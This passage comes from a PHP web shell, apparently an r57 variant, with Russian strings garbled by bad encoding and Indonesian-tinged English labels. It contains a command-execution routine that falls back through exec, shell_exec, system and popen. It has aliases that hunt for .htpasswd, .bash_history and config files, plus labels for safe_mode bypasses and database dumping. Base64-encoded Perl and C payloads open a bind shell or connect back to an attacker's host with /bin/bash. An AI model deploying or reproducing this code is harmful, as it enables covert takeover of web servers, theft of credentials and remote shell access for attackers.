'ru_text70'=>'ÐŸÐ°Ñ€Ð°Ð¼ÐµÑ‚Ñ€2',
'ru_text71'=>"Ð’Ñ‚Ð¾Ñ€Ð¾Ð¹ Ð¿Ð°Ñ€Ð°Ð¼ÐµÑ‚Ñ€ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñ‹:\r\n- Ð´Ð»Ñ CHOWN - Ð¸Ð¼Ñ Ð½Ð¾Ð²Ð¾Ð³Ð¾ Ð¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»Ñ Ð¸Ð»Ð¸ ÐµÐ³Ð¾ UID (Ñ‡Ð¸ÑÐ»Ð¾Ð¼) \r\n- Ð´Ð»Ñ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñ‹ CHGRP - Ð¸Ð¼Ñ Ð³Ñ€ÑƒÐ¿Ð¿Ñ‹ Ð¸Ð»Ð¸ GID (Ñ‡Ð¸ÑÐ»Ð¾Ð¼) \r\n- Ð´Ð»Ñ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñ‹ CHMOD - Ñ†ÐµÐ»Ð¾Ðµ Ñ‡Ð¸ÑÐ»Ð¾ Ð² Ð²Ð¾ÑÑŒÐ¼ÐµÑ€Ð¸Ñ‡Ð½Ð¾Ð¼ Ð¿Ñ€ÐµÐ´ÑÑ‚Ð°Ð²Ð»ÐµÐ½Ð¸Ð¸ (Ð½Ð°Ð¿Ñ€Ð¸Ð¼ÐµÑ€ 0777)",
'ru_text72'=>'Ð¢ÐµÐºÑÑ‚ Ð´Ð»Ñ Ð¿Ð¾Ð¸ÑÐºÐ°',
'ru_text73'=>'Ð˜ÑÐºÐ°Ñ‚ÑŒ Ð² Ð¿Ð°Ð¿ÐºÐµ',
'ru_text74'=>'Ð˜ÑÐºÐ°Ñ‚ÑŒ Ð² Ñ„Ð°Ð¹Ð»Ð°Ñ…',
'ru_text75'=>'* Ð¼Ð¾Ð¶Ð½Ð¾ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ñ€ÐµÐ³ÑƒÐ»ÑÑ€Ð½Ð¾Ðµ Ð²Ñ‹Ñ€Ð°Ð¶ÐµÐ½Ð¸Ðµ',
'ru_text76'=>'ÐŸÐ¾Ð¸ÑÐº Ñ‚ÐµÐºÑÑ‚Ð° Ð² Ñ„Ð°Ð¹Ð»Ð°Ñ… Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ ÑƒÑ‚Ð¸Ð»Ð¸Ñ‚Ñ‹ find',
'ru_text77'=>'ÐŸÑ€Ð¾ÑÐ¼Ð¾Ñ‚Ñ€ ÑÑ‚Ñ€ÑƒÐºÑ‚ÑƒÑ€Ñ‹ Ð±Ð°Ð·Ñ‹ Ð´Ð°Ð½Ð½Ñ‹Ñ…',
'ru_text78'=>'ÐŸÐ¾ÐºÐ°Ð·Ñ‹Ð²Ð°Ñ‚ÑŒ Ñ‚Ð°Ð±Ð»Ð¸Ñ†Ñ‹',
'ru_text79'=>'ÐŸÐ¾ÐºÐ°Ð·Ñ‹Ð²Ð°Ñ‚ÑŒ ÑÑ‚Ð¾Ð»Ð±Ñ†Ñ‹',
'ru_text80'=>'Ð¢Ð¸Ð¿',
'ru_text81'=>'Ð¡ÐµÑ‚ÑŒ',
'ru_text82'=>'Ð‘Ð°Ð·Ñ‹ Ð´Ð°Ð½Ð½Ñ‹Ñ…',
'ru_text83'=>'Ð’Ñ‹Ð¿Ð¾Ð»Ð½ÐµÐ½Ð¸Ðµ SQL Ð·Ð°Ð¿Ñ€Ð¾ÑÐ°',
'ru_text84'=>'SQL Ð·Ð°Ð¿Ñ€Ð¾Ñ',
'ru_text85'=>'ÐŸÑ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð²Ð¾Ð·Ð¼Ð¾Ð¶Ð½Ð¾ÑÑ‚Ð¸ Ð¾Ð±Ñ…Ð¾Ð´Ð° Ð¾Ð³Ñ€Ð°Ð½Ð¸Ñ‡ÐµÐ½Ð¸Ð¹ safe_mode Ñ‡ÐµÑ€ÐµÐ· Ð²Ñ‹Ð¿Ð¾Ð»Ð½ÐµÐ½Ð¸Ðµ ÐºÐ¾Ð¼Ð°Ð½Ð´ Ð² MSSQL ÑÐµÑ€Ð²ÐµÑ€Ðµ',
/* --------------------------------------------------------------- */
'eng_text1' =>'Sikat..!!',
'eng_text2' =>'Sikat.. di server',
'eng_text3' =>'Jalankan perintah',
'eng_text4' =>'Direktori Skrg',
'eng_text5' =>'Upload files ke server',
'eng_text6' =>'Local file',
'eng_text7' =>'Aliases',
'eng_text8' =>'Select alias',
'eng_butt1' =>'Sikat',
'eng_butt2' =>'Upload',
'eng_text9' =>'Bind port to /bin/bash',
'eng_text10'=>'Port',
'eng_text11'=>'Password untuk',
'eng_butt3' =>'Bind',
'eng_text12'=>'back-connect',
'eng_text13'=>'IP',
'eng_text14'=>'Port',
'eng_butt4' =>'Connect',
'eng_text15'=>'Upload files from remote server',
'eng_text16'=>'With',
'eng_text17'=>'Remote file',
'eng_text18'=>'Local file',
'eng_text19'=>'Exploits',
'eng_text20'=>'Use',
'eng_text21'=>'&nbsp;New name',
'eng_text22'=>'datapipe',
'eng_text23'=>'Local port',
'eng_text24'=>'Remote host',
'eng_text25'=>'Remote port',
'eng_text26'=>'Use',
'eng_butt5' =>'Run',
'eng_text28'=>'Work in safe_mode',
'eng_text29'=>'ACCESS DENIED',
'eng_butt6' =>'Change',
'eng_text30'=>'Cat file',
'eng_butt7' =>'Show',
'eng_text31'=>'File not found',
'eng_text32'=>'Eval PHP code',
'eng_text33'=>'Test bypass open_basedir with cURL functions',
'eng_butt8' =>'Test',
'eng_text34'=>'Test bypass safe_mode with include function',
'eng_text35'=>'Test bypass safe_mode with load file in mysql',
'eng_text36'=>'Database',
'eng_text37'=>'Login',
'eng_text38'=>'Password',
'eng_text39'=>'Table',
'eng_text40'=>'Dump database table',
'eng_butt9' =>'Dump',
'eng_text41'=>'Save dump in file',
'eng_text42'=>'Edit files',
'eng_text43'=>'File for edit',
'eng_butt10'=>'Save',
'eng_text44'=>'Can\'t edit file! Only read access!',
'eng_text45'=>'File saved',
'eng_text46'=>'Show phpinfo()',
'eng_text47'=>'Show variables from php.ini',
'eng_text48'=>'Delete temp files',
'eng_butt11'=>'Edit file',
'eng_text49'=>'Delete script from server',
'eng_text50'=>'View cpu info',
'eng_text51'=>'View memory info',
'eng_text52'=>'Find text',
'eng_text53'=>'In dirs',
'eng_text54'=>'Find text in files',
'eng_butt12'=>'Find',
'eng_text55'=>'Only in files',
'eng_text56'=>'Nothing :(',
'eng_text57'=>'Create/Delete File/Dir',
'eng_text58'=>'name',
'eng_text59'=>'file',
'eng_text60'=>'dir',
'eng_butt13'=>'Create/Delete',
'eng_text61'=>'File created',
'eng_text62'=>'Dir created',
'eng_text63'=>'File deleted',
'eng_text64'=>'Dir deleted',
'eng_text65'=>'Create',
'eng_text66'=>'Delete',
'eng_text67'=>'Chown/Chgrp/Chmod',
'eng_text68'=>'Command',
'eng_text69'=>'param1',
'eng_text70'=>'param2',
'eng_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'eng_text72'=>'Text for find',
'eng_text73'=>'Find in folder',
'eng_text74'=>'Find in files',
'eng_text75'=>'* you can use regexp',
'eng_text76'=>'Search text in files via find',
'eng_text77'=>'Show database structure',
'eng_text78'=>'show tables',
'eng_text79'=>'show columns',
'eng_text80'=>'Type',
'eng_text81'=>'Net',
'eng_text82'=>'Databases',
'eng_text83'=>'Run SQL query',
'eng_text84'=>'SQL query',
);
/*
ÐÐ»Ð¸Ð°ÑÑ‹ ÐºÐ¾Ð¼Ð°Ð½Ð´
ÐŸÐ¾Ð·Ð²Ð¾Ð»ÑÑŽÑ‚ Ð¸Ð·Ð±ÐµÐ¶Ð°Ñ‚ÑŒ Ð¼Ð½Ð¾Ð³Ð¾ÐºÑ€Ð°Ñ‚Ð½Ð¾Ð³Ð¾ Ð½Ð°Ð±Ð¾Ñ€Ð° Ð¾Ð´Ð½Ð¸Ñ… Ð¸ Ñ‚ÐµÑ…-Ð¶Ðµ ÐºÐ¾Ð¼Ð°Ð½Ð´. ( Ð¡Ð´ÐµÐ»Ð°Ð½Ð¾ Ð±Ð»Ð°Ð³Ð¾Ð´Ð°Ñ€Ñ Ð¼Ð¾ÐµÐ¹ Ð¿Ñ€Ð¸Ñ€Ð¾Ð´Ð½Ð¾Ð¹ Ð»ÐµÐ½Ð¸ )
Ð’Ñ‹ Ð¼Ð¾Ð¶ÐµÑ‚Ðµ ÑÐ°Ð¼Ð¸ Ð´Ð¾Ð±Ð°Ð²Ð»ÑÑ‚ÑŒ Ð¸Ð»Ð¸ Ð¸Ð·Ð¼ÐµÐ½ÑÑ‚ÑŒ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñ‹.
*/
$aliases=array(
'find suid files'=>'find / -type f -perm -04000 -ls',
'find suid files in current dir'=>'find . -type f -perm -04000 -ls',
'find sgid files'=>'find / -type f -perm -02000 -ls',
'find sgid files in current dir'=>'find . -type f -perm -02000 -ls',
'find config.inc.php files'=>'find / -type f -name config.inc.php',
'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php',
'find config* files'=>'find / -type f -name "config*"',
'find config* files in current dir'=>'find . -type f -name "config*"',
'find all writable files'=>'find / -type f -perm -2 -ls',
'find all writable files in current dir'=>'find . -type f -perm -2 -ls',
'find all writable directories'=>'find /  -type d -perm -2 -ls',
'find all writable directories in current dir'=>'find . -type d -perm -2 -ls',
'find all writable directories and files'=>'find / -perm -2 -ls',
'find all writable directories and files in current dir'=>'find . -perm -2 -ls',
'find all service.pwd files'=>'find / -type f -name service.pwd',
'find service.pwd files in current dir'=>'find . -type f -name service.pwd',
'find all .htpasswd files'=>'find / -type f -name .htpasswd',
'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd',
'find all .bash_history files'=>'find / -type f -name .bash_history',
'find .bash_history files in current dir'=>'find . -type f -name .bash_history',
'find all .mysql_history files'=>'find / -type f -name .mysql_history',
'find .mysql_history files in current dir'=>'find . -type f -name .mysql_history',
'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc',
'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc',
'list file attributes on a Linux second extended file system'=>'lsattr -va',
'show opened ports'=>'netstat -an | grep -i listen',
'----------------------------------------------------------------------------------------------------'=>'ls -la'
);
$table_up1  = "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: ";
$table_up2  = " ::</div></b></font></td></tr><tr><td>";
$table_up3  = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc>";
$table_end1 = "</td></tr>";
$arrow = " <font face=Wingdings color=gray>Ð¸</font>";
$lb = "<font color=black>[</font>";
$rb = "<font color=black>]</font>";
$font = "<font face=Verdana size=-2>";
$ts = "<table class=table1 width=100% align=center>";
$te = "</table>";
$fs = "<form name=form method=POST>";
$fe = "</form>";

if (!empty($_POST['dir'])) { @chdir($_POST['dir']); }
$dir = @getcwd();
$windows = 0;
$unix = 0;
if(strlen($dir)>1 && $dir[1]==":") $windows=1; else $unix=1;
if(empty($dir))
 {
 $os = getenv('OS');
 if(empty($os)){ $os = php_uname(); }
 if(empty($os)){ $os ="-"; $unix=1; }
 else
    {
    if(@eregi("^win",$os)) { $windows = 1; }
    else { $unix = 1; }
    }
 }
if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == "search_text")
  {
    echo $head;
    if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask']); }
    else { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']); }
    $sr->SearchText(0,0);
    $res = $sr->GetResultFiles();
    $found = $sr->GetMatchesCount();
    $titles = $sr->GetTitles();
    $r = "";
    if($found > 0)
    {
      $r .= "<TABLE width=100%>";
      foreach($res as $file=>$v)
      {
        $r .= "<TR>";
        $r .= "<TD colspan=2><font face=Verdana size=-2><b>".ws(3);
        $r .= ($windows)? str_replace("/","\\",$file) : $file;
        $r .= "</b></font></ TD>";
        $r .= "</TR>";
        foreach($v as $a=>$b)
        {
          $r .= "<TR>";
          $r .= "<TD align=center><B><font face=Verdana size=-2>".$a."</font></B></TD>";
          $r .= "<TD><font face=Verdana size=-2>".ws(2).$b."</font></TD>";
          $r .= "</TR>\n";
        }
      }
      $r .= "</TABLE>";
    echo $r;
    }
    else
    {
      echo "<P align=center><B><font face=Verdana size=-2>".$lang[$language.'_text56']."</B></font></P>";
    }
  echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
  die();
  }
if($windows&&!$safe_mode)
 {
 $uname = ex("ver");
 if(empty($uname)) { $safe_mode = 1; }
 }
else if($unix&&!$safe_mode)
 {
 $uname = ex("uname");
 if(empty($uname)) { $safe_mode = 1; }
 }
$SERVER_SOFTWARE = getenv('SERVER_SOFTWARE');
if(empty($SERVER_SOFTWARE)){ $SERVER_SOFTWARE = "-"; }
function ws($i)
{
return @str_repeat("&nbsp;",$i);
}
function ex($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
  if(function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   while(!@feof($f)) { $res .= @fread($f,1024); }
   @pclose($f);
  }
 }
 return $res;
}
function we($i)
{
if($GLOBALS['language']=="ru"){ $text = 'ÐžÑˆÐ¸Ð±ÐºÐ°! ÐÐµ Ð¼Ð¾Ð³Ñƒ Ð·Ð°Ð¿Ð¸ÑÐ°Ñ‚ÑŒ Ð² Ñ„Ð°Ð¹Ð» '; }
else { $text = "[-] ERROR! Can't write in file "; }
echo "<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
return null;
}
function re($i)
{
if($GLOBALS['language']=="ru"){ $text = 'ÐžÑˆÐ¸Ð±ÐºÐ°! ÐÐµ Ð¼Ð¾Ð³Ñƒ Ð¿Ñ€Ð¾Ñ‡Ð¸Ñ‚Ð°Ñ‚ÑŒ Ñ„Ð°Ð¹Ð» '; }
else { $text = "[-] ERROR! Can't read file "; }
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
return null;
}
function ce($i)
{
if($GLOBALS['language']=="ru"){ $text = "ÐÐµ ÑƒÐ´Ð°Ð»Ð¾ÑÑŒ ÑÐ¾Ð·Ð´Ð°Ñ‚ÑŒ "; }
else { $text = "Can't create "; }
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
return null;
}
function perms($mode)
{
if ($GLOBALS['windows']) return 0;
if( $mode & 0x1000 ) { $type='p'; }
else if( $mode & 0x2000 ) { $type='c'; }
else if( $mode & 0x4000 ) { $type='d'; }
else if( $mode & 0x6000 ) { $type='b'; }
else if( $mode & 0x8000 ) { $type='-'; }
else if( $mode & 0xA000 ) { $type='l'; }
else if( $mode & 0xC000 ) { $type='s'; }
else $type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}
function in($type,$name,$size,$value)
{
 $ret = "<input type=".$type." name=".$name." ";
 if($size != 0) { $ret .= "size=".$size." "; }
 $ret .= "value=\"".$value."\">";
 return $ret;
}
function which($pr)
{
$path = ex("which $pr");
if(!empty($path)) { return $path; } else { return $pr; }
}
function cf($fname,$text)
{
 $w_file=@fopen($fname,"w") or we($fname);
 if($w_file)
 {
 @fputs($w_file,@base64_decode($text));
 @fclose($w_file);
 }
}
function sr($l,$t1,$t2)
 {
 return "<tr class=tr1><td class=td1 width=".$l."% align=right>".$t1."</td><td class=td1 align=left>".$t2."</td></tr>";
 }
if (!@function_exists("view_size"))
{
function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
}
function DirFiles($dir,$types='')
  {
    $files = Array();
    if(($handle = @opendir($dir)))
    {
      while (FALSE !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(!is_dir($dir."/".$file))
          {
            if($types)
            {
              $pos = @strrpos($file,".");
              $ext = @substr($file,$pos,@strlen($file)-$pos);
              if(@in_array($ext,@explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
  }
  function DirFilesWide($dir)
  {
    $files = Array();
    $dirs = Array();
    if(($handle = @opendir($dir)))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
          {
            $file = @strtoupper($file);
            $dirs[$file] = '&lt;DIR&gt;';
          }
          else
            $files[$file] = @filesize($dir."/".$file);
        }
      }
      @closedir($handle);
      @ksort($dirs);
      @ksort($files);
      $files = @array_merge($dirs,$files);
    }
    return $files;
  }
  function DirFilesR($dir,$types='')
  {
    $files = Array();
    if(($handle = @opendir($dir)))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(@is_dir($dir."/".$file))
            $files = @array_merge($files,DirFilesR($dir."/".$file,$types));
          else
          {
            $pos = @strrpos($file,".");
            $ext = @substr($file,$pos,@strlen($file)-$pos);
            if($types)
            {
              if(@in_array($ext,explode(';',$types)))
                $files[] = $dir."/".$file;
            }
            else
              $files[] = $dir."/".$file;
          }
        }
      }
      @closedir($handle);
    }
    return $files;
  }
  function DirPrintHTMLHeaders($dir)
  {
    $pockets = '';
  	$handle = @opendir($dir) or die("Can't open directory $dir");
    echo "    <ul style='margin-left: 0px; padding-left: 20px;'>\n";
    while (false !== ($file = @readdir($handle)))
    {
      if ($file != "." && $file != "..")
      {
        if(@is_dir($dir."/".$file))
        {
          echo "      <li><b>[ $file ]</b></li>\n";
          DirPrintHTMLHeaders($dir."/".$file);
        }
        else
        {
          $pos = @strrpos($file,".");
          $ext = @substr($file,$pos,@strlen($file)-$pos);
          if(@in_array($ext,array('.htm','.html')))
          {
            $header = '-=None=-';
            $strings = @file($dir."/".$file) or die("Can't open file ".$dir."/".$file);
            for($a=0;$a<count($strings);$a++)
            {
              $pattern = '(<title>(.+)</title>)';
              if(@eregi($pattern,$strings[$a],$pockets))
              {
                $header = "&laquo;".$pockets[2]."&raquo;";
                break;
              }
            }
            echo "      <li>".$header."</li>\n";
          }
        }
      }
    }
    echo "    </ul>\n";
    @closedir($handle);
  }

  class SearchResult
  {
    var $text;
    var $FilesToSearch;
    var $ResultFiles;
    var $FilesTotal;
    var $MatchesCount;
    var $FileMatschesCount;
    var $TimeStart;
    var $TimeTotal;
    var $titles;
    function SearchResult($dir,$text,$filter='')
    {
      $dirs = @explode(";",$dir);
      $this->FilesToSearch = Array();
      for($a=0;$a<count($dirs);$a++)
        $this->FilesToSearch = @array_merge($this->FilesToSearch,DirFilesR($dirs[$a],$filter));
      $this->text = $text;
      $this->FilesTotal = @count($this->FilesToSearch);
      $this->TimeStart = getmicrotime();
      $this->MatchesCount = 0;
      $this->ResultFiles = Array();
      $this->FileMatchesCount = Array();
      $this->titles = Array();
    }
    function GetFilesTotal() { return $this->FilesTotal; }
    function GetTitles() { return $this->titles; }
    function GetTimeTotal() { return $this->TimeTotal; }
    function GetMatchesCount() { return $this->MatchesCount; }
    function GetFileMatchesCount() { return $this->FileMatchesCount; }
    function GetResultFiles() { return $this->ResultFiles; }
    function SearchText($phrase=0,$case=0) {
    $qq = @explode(' ',$this->text);
    $delim = '|';
      if($phrase)
        foreach($qq as $k=>$v)
          $qq[$k] = '\b'.$v.'\b';
      $words = '('.@implode($delim,$qq).')';
      $pattern = "/".$words."/";
      if(!$case)
        $pattern .= 'i';
      foreach($this->FilesToSearch as $k=>$filename)
      {
        $this->FileMatchesCount[$filename] = 0;
        $FileStrings = @file($filename) or @next;
        for($a=0;$a<@count($FileStrings);$a++)
        {
          $count = 0;
          $CurString = $FileStrings[$a];
          $CurString = @Trim($CurString);
          $CurString = @strip_tags($CurString);
          $aa = '';
          if(($count = @preg_match_all($pattern,$CurString,$aa)))
          {
            $CurString = @preg_replace($pattern,"<SPAN style='color: #990000;'><b>\\1</b></SPAN>",$CurString);
            $this->ResultFiles[$filename][$a+1] = $CurString;
            $this->MatchesCount += $count;
            $this->FileMatchesCount[$filename] += $count;
          }
        }
      }
      $this->TimeTotal = @round(getmicrotime() - $this->TimeStart,4);
    }
  }
  function getmicrotime()
  {
    list($usec,$sec) = @explode(" ",@microtime());
    return ((float)$usec + (float)$sec);
  }
$port_bind_bd_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZS
A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50I
GFyZ2M7DQpjaGFyICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1Y3Qgc29ja2FkZHJfaW4gcmVt
b3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9
pKGFyZ3ZbMV0pKTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULF
NPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigic29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgK
ikmcmVtb3RlLCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7DQog
ICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsNCiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk
7DQogICByZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1ZikpDQogICBzeXN0ZW0oImVjaG8gd2VsY2
9tZSB0byByNTcgc2hlbGwgJiYgL2Jpbi9iYXNoIC1pIik7DQogICBlbHNlDQogICBmcHJpbnRmKHN0ZGVyciwiU29ycnkiKTsNCiAgIGNsb3NlKG5ld
2ZkKTsNCiAgfQ0KIH0NCn0NCmludCBjaHBhc3MoY2hhciAqYmFzZSwgY2hhciAqZW50ZXJlZCkgew0KaW50IGk7DQpmb3IoaT0wO2k8c3RybGVuKGVu
dGVyZWQpO2krKykgDQp7DQppZihlbnRlcmVkW2ldID09ICdcbicpDQplbnRlcmVkW2ldID0gJ1wwJzsgDQppZihlbnRlcmVkW2ldID09ICdccicpDQp
lbnRlcmVkW2ldID0gJ1wwJzsNCn0NCmlmICghc3RyY21wKGJhc2UsZW50ZXJlZCkpDQpyZXR1cm4gMDsNCn0=";
$port_bind_bd_pl="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vYmFzaCAtaSI7DQppZiAoQEFSR1YgPCAxKSB7IGV4aXQoMSk7IH0NCiRMS
VNURU5fUE9SVD0kQVJHVlswXTsNCnVzZSBTb2NrZXQ7DQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0Kc29ja2V0KFMsJlBGX0lORVQs
JlNPQ0tfU1RSRUFNLCRwcm90b2NvbCkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVV
TRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJExJU1RFTl9QT1JULElOQUREUl9BTlkpKSB8fCBkaWUgIkNhbnQgb3BlbiBwb3J0XG4iOw0KbG
lzdGVuKFMsMykgfHwgZGllICJDYW50IGxpc3RlbiBwb3J0XG4iOw0Kd2hpbGUoMSkNCnsNCmFjY2VwdChDT05OLFMpOw0KaWYoISgkcGlkPWZvcmspK
Q0Kew0KZGllICJDYW5ub3QgZm9yayIgaWYgKCFkZWZpbmVkICRwaWQpOw0Kb3BlbiBTVERJTiwiPCZDT05OIjsNCm9wZW4gU1RET1VULCI+JkNPTk4i
Ow0Kb3BlbiBTVERFUlIsIj4mQ09OTiI7DQpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCmNsb3N
lIENPTk47DQpleGl0IDA7DQp9DQp9";
$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj
aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR
hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT
sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI
kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi
KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl
OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC
BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb
SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd
KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ
sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC
Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D
